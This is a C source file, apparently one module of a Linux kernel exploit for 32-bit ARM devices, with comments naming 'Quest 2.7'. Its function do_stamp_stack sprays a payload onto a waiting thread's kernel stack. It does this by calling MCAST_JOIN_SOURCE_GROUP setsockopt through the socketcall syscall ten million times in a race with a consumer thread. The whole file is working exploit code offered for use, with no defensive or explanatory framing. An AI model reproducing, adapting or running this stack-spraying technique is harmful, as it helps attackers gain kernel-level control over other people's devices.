/*
 * exp32 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 32-bit only (see main.c).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>

#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

void do_stamp_stack(uint64_t *buf) {
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    memset(buffer, 0, sizeof(buffer));
    pr_info("stamp: socketcall path off=0x70\n");
    memcpy(buffer + 0x70, buf, 0x50);   // was 0x34, now 0x70
    uint64_t times = 10000000;

    // ARM 32-bit: direct setsockopt (NR=366) returns ENOSYS on Quest 2.7
    // Use socketcall(SYS_SETSOCKOPT=14) via NR_socketcall=102 instead
    unsigned long args[5] = {
        (unsigned long)fd,
        IPPROTO_IPV6,
        MCAST_JOIN_SOURCE_GROUP,
        (unsigned long)buffer,
        260
    };

    while (times--) {
        atomic_store(&g_consumer_go, 1);
        syscall(102, 14, args);  // socketcall(SYS_SETSOCKOPT, args)
    }
    close(fd);
}
